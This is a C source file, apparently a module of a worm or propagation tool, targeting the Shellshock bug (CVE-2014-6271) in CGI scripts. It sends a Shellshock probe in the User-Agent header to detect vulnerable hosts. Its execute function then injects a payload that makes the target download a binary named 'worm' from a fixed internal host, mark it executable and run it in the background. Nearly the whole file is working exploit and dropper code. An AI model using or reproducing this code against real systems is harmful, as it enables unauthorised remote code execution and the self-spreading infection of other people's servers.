#define _POSIX_C_SOURCE 200809L
#include "cve_2014_6271.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

static int send_http_request(const char* ip, int port, const char* path, 
                            const char* user_agent, char* response, size_t response_size) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }
    
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    char request[2048];
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, ip, port, user_agent);
    
    if (send(sock, request, strlen(request), 0) < 0) {
        close(sock);
        return -1;
    }
    
    ssize_t total = 0;
    ssize_t n;
    while ((n = recv(sock, response + total, response_size - total - 1, 0)) > 0) {
        total += n;
        if (total >= (ssize_t)(response_size - 1)) break;
    }
    response[total] = '\0';
    
    close(sock);
    return 0;
}

// CVE-2014-6271 (Shellshock) Scan Handler
// Scans a specific target IP for Shellshock vulnerability
// If target_ip is NULL, returns not vulnerable (handler requires a target)
cve_scan_result_t cve_2014_6271_scan(const char* target_ip) {
    cve_scan_result_t result = {0};
    result.cve_id = CVE_2014_6271;
    
    // If no target IP provided, return not vulnerable
    // This handler requires a specific target to scan
    if (!target_ip) {
        result.is_vulnerable = 0;
        result.confidence = 0;
        result.port_open = 0;
        result.service_type[0] = '\0';
        return result;
    }
    
    char response[4096];
    const char* payload = "() { :; }; echo VULNERABLE";
    
    if (send_http_request(target_ip, 80, "/cgi-bin/status.cgi", payload, response, sizeof(response)) == 0) {
        if (strstr(response, "VULNERABLE") != NULL) {
            result.is_vulnerable = 1;
            result.confidence = 8;
            result.port_open = 80;
            strncpy(result.service_type, "HTTP", sizeof(result.service_type) - 1);
            return result;
        }
    }
    
    if (send_http_request(target_ip, 80, "/cgi-bin/test.cgi", payload, response, sizeof(response)) == 0) {
        if (strstr(response, "VULNERABLE") != NULL) {
            result.is_vulnerable = 1;
            result.confidence = 7;
            result.port_open = 80;
            strncpy(result.service_type, "HTTP", sizeof(result.service_type) - 1);
            return result;
        }
    }
    
    result.is_vulnerable = 0;
    result.confidence = 3;
    result.port_open = 0;
    result.service_type[0] = '\0';
    
    return result;
}

// CVE-2014-6271 (Shellshock) Execution Handler
int cve_2014_6271_execute(const char* target_ip) {
    const char* worm_url = "http://172.28.1.1/worm";
    const char* remote_path = "/tmp/worm";
    
    char payload[1024];
    snprintf(payload, sizeof(payload),
        "() { :; }; /bin/bash -c 'wget -q -O %s %s 2>/dev/null; chmod +x %s 2>/dev/null; nohup %s > /tmp/worm.log 2>&1 &'",
        remote_path, worm_url, remote_path, remote_path);
    
    char response[4096];
    if (send_http_request(target_ip, 80, "/cgi-bin/status.cgi", payload, response, sizeof(response)) == 0) {
        return 1;
    }
    
    if (send_http_request(target_ip, 80, "/cgi-bin/test.cgi", payload, response, sizeof(response)) == 0) {
        return 1;
    }
    
    return 0;
}

